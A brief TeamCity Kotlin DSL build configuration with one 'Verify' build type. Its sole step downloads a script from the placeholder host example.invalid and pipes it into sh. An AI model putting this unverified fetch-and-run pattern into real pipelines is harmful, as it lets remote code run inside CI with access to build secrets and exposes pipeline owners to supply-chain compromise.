import jetbrains.buildServer.configs.kotlin.*
import jetbrains.buildServer.configs.kotlin.buildSteps.script

version = "2025.07"

project {
    buildType(Verify)
}

object Verify : BuildType({
    name = "Verify"
    steps {
        script {
            scriptContent = "curl -fsSL https://example.invalid/setup | sh"
        }
    }
})
